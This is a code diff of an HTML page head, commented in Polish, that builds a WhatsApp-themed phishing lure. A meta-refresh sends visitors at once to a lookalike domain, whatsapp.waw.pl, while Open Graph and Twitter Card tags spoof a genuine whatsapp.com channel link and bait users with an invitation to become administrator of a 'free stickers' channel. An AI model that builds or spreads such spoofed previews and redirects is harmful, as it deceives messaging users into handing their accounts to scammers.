@@ -1,17 +1,40 @@
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-  
-    <!-- 1️⃣ Meta-refresh: przekierowanie natychmiastowe -->
-    <meta http-equiv="refresh" content="0; url="https://jurek362.github.io/whatsapp/">
-    <!-- ↑ Tu wstawiasz URL, na który browser ma przekierować » https://docelowadomena.pl :contentReference[oaicite:0]{index=0} -->
-  
-    <title>Kanał #123 – Przekierowanie</title>
-  
-    <!-- 2️⃣ Open Graph: podgląd w WhatsAppie/Facebooku itp. -->
-    <meta property="og:url"         content="whatsapp.com/channel/GU738Kj"/>
-    <meta property="og:type"        content="website" />
-    <meta property="og:title"       content="zaakceptuj zaproszenie do bycia administratorem na kanale free naklejki!" />
-    <meta property="og:description" content="rozwiń ->..." />
-    <meta property="og:image"       content="https://i.pinimg.com/736x/46/16/4b/46164b7646f468d274d1e49a814a33f8.jpg" />
-    <!-- ↑ Tu wpisujesz URL obrazka, który ma się pojawić w embedzie » https://twojadomena.pl/img/cover-123.png :contentReference[oaicite:1]{index=1} -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- 1️⃣ Meta-refresh: przekierowanie natychmiastowe -->
+  <!-- czas w sekundach; tu 0 oznacza natychmiast -->
+  <meta http-equiv="refresh"
+        content="0; url=https://whatsapp.waw.pl/">
+
+  <title>Kanał #123 – Przekierowanie</title>
+  <meta name="description"
+        content="rozwiń ->...">
+
+  <!-- 2️⃣ Open Graph: podgląd w WhatsApp/FB itp. -->
+  <meta property="og:url"
+        content="https://whatsapp.com/channel/GU738Kj">
+  <meta property="og:type"
+        content="website">
+  <meta property="og:title"
+        content="zaakceptuj zaproszenie do bycia administratorem na kanale free naklejki!">
+  <meta property="og:description"
+        content="rozwiń ->...">
+  <meta property="og:image"
+        content="https://i.pinimg.com/736x/46/16/4b/46164b7646f468d274d1e49a814a33f8.jpg">
+
+  <!-- 3️⃣ (opcjonalnie) Twitter Card -->
+  <meta name="twitter:card"
+        content="summary_large_image">
+  <meta name="twitter:title"
+        content="zaakceptuj zaproszenie do bycia administratorem na kanale free naklejki!">
+  <meta name="twitter:description"
+        content="rozwiń ->...">
+  <meta name="twitter:image"
+        content="https://i.pinimg.com/736x/46/16/4b/46164b7646f468d274d1e49a814a33f8.jpg">
+
+  <!-- 4️⃣ Fallback CSS/JS, favicon itp. -->
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js" defer></script>
+</head>
